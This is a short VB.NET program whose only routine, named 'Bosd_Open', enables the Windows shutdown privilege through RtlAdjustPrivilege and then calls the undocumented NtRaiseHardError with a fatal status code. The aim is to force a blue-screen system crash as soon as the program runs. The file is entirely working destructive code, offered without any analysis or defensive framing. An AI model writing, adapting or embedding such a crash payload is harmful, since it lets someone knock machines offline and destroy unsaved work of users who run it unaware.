Imports System

Module Program
    Private Declare Function RtlAdjustPrivilege Lib "ntdll" (ByVal Privilege As Long, ByVal Enable As Boolean, ByVal CurrentThread As Boolean, ByVal Enabled As Long) As Long

    Private Declare Function NtRaiseHardError Lib "ntdll" (ByVal ErrorStatus As Long, ByVal NumberOfParameters As Long, ByVal nNumberOfBytesToRead As Long, ByVal UnicodeStringParameterMask As Long, ByVal Parameters As Long, ByVal ResponseOption As Long, ByRef Response As Long) As Long

    Private Sub Bosd_Open()
        Dim x As Long
        Dim y As Long
        Dim r As Long
        x = RtlAdjustPrivilege(19, True, False, 0)
        y = NtRaiseHardError(-1073741286, 0, 0, 0, 6, 0, r)
    End Sub
    Sub Main(args As String())
        Bosd_Open()
    End Sub
End Module
